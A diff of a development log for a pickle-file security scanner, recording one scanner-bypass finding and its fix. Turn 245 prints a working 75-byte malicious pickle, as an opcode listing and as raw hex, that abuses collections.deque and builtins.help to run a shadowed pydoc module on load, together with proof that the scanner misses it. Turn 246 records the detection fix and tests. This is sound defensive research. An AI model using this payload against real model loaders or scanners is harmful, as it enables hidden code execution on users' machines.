@@ -15101,3 +15101,192 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3746 passed, 1022 skipped, 21 warnings in 54.52s`.
+
+## Turn 245 - Bypass via `collections.deque` call-iterator consumption with `maxlen`
+
+Found another scanner-clean RCE-capable bypass in the finite call-iterator
+consumer family. Turn 230 taught the native model that
+`collections.deque(iterator)` eagerly consumes a tracked
+`iter(callable, sentinel)`. The model currently only matches exactly one
+argument for eager consumers. Python also allows `collections.deque(iterable,
+maxlen)`, and constructing that deque still consumes the iterable even when
+`maxlen=0`.
+
+The payload constructs `iter(builtins.help, "stop")`, then invokes
+`collections.deque(iterator, 0)`. `deque(...)` drains the call iterator;
+`help()` runs once, returns the sentinel, and enters
+`_sitebuiltins._Helper.__call__`, which imports `pydoc`. A shadow `pydoc.py` at
+the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL collections deque
+MARK
+BINGET 0
+BININT1 0
+TUPLE
+REDUCE              # collections.deque(iterator, 0)
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c0b636f6c6c656374696f6e738c056465717565932868004b0074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 75
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', False, None),
+  ('builtins', 'help', False, None),
+  ('collections', 'deque', False, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'deque', 2, 73),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result deque([], maxlen=0)
+runtime_type deque
+runtime_len 0
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and provided a minimal
+`help` function returning `"stop"` so the call iterator stops after one hidden
+call.
+
+Why it bypasses:
+
+- Native policy does not mark `builtins.iter`, `builtins.help`, or
+  `collections.deque` as dangerous.
+- The native stack model tracks `iter(help, "stop")` as a `CallIterator`, but
+  `call_iterator_consumption_invocations(...)` only emits the hidden callable
+  invocation for exact one-argument eager consumers.
+- `collections.deque(iterator, maxlen)` is still an eager consumer; the second
+  argument only bounds retained output, not iteration side effects.
+- The call graph already maps an invoked `builtins.help()` to
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`, but native metadata
+  never emits that hidden zero-argument invocation for the two-argument deque
+  shape.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Split eager call-iterator consumer arity by callable:
+  - `list`, `tuple`, `set`, `frozenset`, and `dict` should keep requiring
+    exactly one visible argument;
+  - `collections.deque` should accept one or two visible arguments when the
+    first argument is a tracked `CallIterator`.
+- Emit the same synthetic zero-argument invocation of the stored callable at
+  the deque opcode.
+- Keep this stack-local and finite; no new dangerous-global policy entry is
+  needed.
+
+Performance note:
+
+- Payload size is 75 bytes.
+- Warm scan median over 1000 runs was `0.000054s` with max `0.000348s`.
+- A fix only needs to inspect the already-extracted argument list for
+  `collections.deque`.
+
+## Turn 246 - Defense for `collections.deque` call-iterator `maxlen` consumption
+
+Blocked the Turn 245 bypass by making eager call-iterator consumption arity
+specific instead of treating every eager consumer as exactly one-argument. The
+native stack model still keeps ordinary container constructors narrow, while
+`collections.deque` now covers both documented constructor shapes that consume
+the iterable.
+
+Implementation:
+
+- Replaced the single `is_eager_call_iterator_consumer(...)` exact-one-arg path
+  with `eager_call_iterator_consumed_callable(...)`.
+- Built-in eager consumers `dict`, `frozenset`, `list`, `set`, and `tuple`
+  still require exactly one visible argument.
+- `collections.deque` accepts one or two visible arguments, and emits the
+  synthetic zero-argument invocation when the first argument is a tracked
+  `CallIterator`.
+- Kept `collections.deque` itself clean; detection stays on the hidden call
+  edge from iterator consumption.
+
+Regression coverage:
+
+- Added `test_scan_bytes_blocks_deque_call_iterator_consumption_rce`.
+- The test verifies lazy `iter(help, "stop")` construction remains clean.
+- The malicious cases verify both `deque(iterator)` and
+  `deque(iterator, 0)` are malicious, record a hidden zero-argument
+  `builtins.help` invocation, and execute in a child interpreter with a shadow
+  `pydoc.py` marker proof.
+
+Post-fix proof:
+
+```text
+payload_len 75
+scan malicious findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [('builtins', 'iter', False, None), ('builtins', 'help', False, None), ('collections', 'deque', False, None)]
+invocations [('builtins', 'iter', 2, 43), ('collections', 'deque', 2, 73), ('builtins', 'help', 0, 73)]
+runtime rc 0
+runtime_result deque([], maxlen=0)
+runtime_type deque
+runtime_len 0
+runtime_maxlen 0
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+timing_median 0.000118
+timing_max 0.000187
+```
+
+Performance note:
+
+- The new path is stack-local and only inspects the already-extracted reducer
+  argument list for known call-iterator consumers.
+- The arity split avoids broadening built-in container constructors while
+  covering `deque(iterable, maxlen)`.
+- Warm scan median for the fixed 75-byte payload was `0.000118s` over 1000
+  runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `collections.deque` regression: `2 passed in 0.35s`.
+- Focused import/call-graph regression file: `33 passed in 1.19s`.
+- Focused call-graph suite: `71 passed in 2.88s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  0.66s`.
+- `ruff format`: `1 file reformatted, 391 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3748 passed, 1022 skipped, 21 warnings in 44.82s`.
